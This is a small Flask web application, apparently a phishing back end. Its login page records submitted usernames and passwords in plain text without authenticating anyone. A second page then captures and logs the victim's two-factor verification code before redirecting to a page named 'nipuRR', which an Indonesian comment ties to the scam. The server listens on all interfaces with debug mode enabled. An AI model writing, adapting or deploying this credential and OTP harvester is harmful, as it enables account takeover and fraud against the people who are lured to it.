from flask import Flask, render_template, request, redirect, url_for
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        logging.info(f"User attempted login: username={username}, password={password}")
        return redirect(url_for('verify'))
    return render_template('login.html')


@app.route('/verify', methods=['GET', 'POST'])
def verify():
    if request.method == 'POST':
        code = request.form['code']
        logging.info(f"User entered verification code: {code}")
        return redirect(url_for('nipuRR')) # Redirect ke halaman nipuRR setelah verifikasi
    return render_template('verify.html')

@app.route('/nipuRR')
def nipuRR():
    return render_template('nipuRR.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
